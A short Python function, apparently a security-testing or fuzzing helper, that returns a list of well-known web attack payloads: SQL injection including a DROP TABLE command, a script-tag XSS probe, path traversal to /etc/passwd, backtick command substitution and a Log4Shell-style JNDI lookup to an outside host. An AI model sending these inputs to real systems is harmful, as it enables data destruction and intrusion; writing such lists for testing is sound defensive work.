def get_payloads():
    return [
        "' OR '1'='1",
        "'; DROP TABLE users;--",
        "<script>alert('XSS')</script>",
        "../../etc/passwd",
        "`ls`",
        "${jndi:ldap://example.com/a}",
        "%2e%2e%2f"  # ../ in URL encoding
    ]
